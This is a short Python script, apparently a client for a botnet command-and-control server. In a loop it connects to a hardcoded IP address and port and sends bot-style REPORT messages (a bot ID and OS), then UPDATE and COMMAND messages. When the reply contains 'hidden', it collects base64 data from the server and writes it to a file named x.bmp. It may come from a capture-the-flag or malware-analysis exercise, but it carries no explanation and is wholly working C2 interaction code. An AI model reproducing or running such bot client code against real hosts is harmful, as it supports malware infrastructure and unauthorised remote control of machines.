import socket
from base64 import b64decode
import time

while True:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server_addr = ("18.195.107.195", 5376)
	sock.connect(server_addr)

	sock.sendall(b'REPORT botid=210d12e9413a4e1c os=linux <END>\n')
	sock.recv(4096)

	sock.sendall(b'UPDATE version=1.33.7 <END>\n')
	sock.recv(4096)

	sock.sendall(b'COMMAND <END>\n')
	data = sock.recv(4096)

	if b'hidden' not in data:
		sock.sendall(b'DONE <END>\n')
		sock.close()
	else:	
		# COMMAND hidden 
		start_time = time.time()
		while time.time() - start_time < 10:
			data += sock.recv(4096)
		with open('x.bmp', 'wb') as f:
			f.write(b64decode(data[15:] + b'='))	
		sock.close()
		break
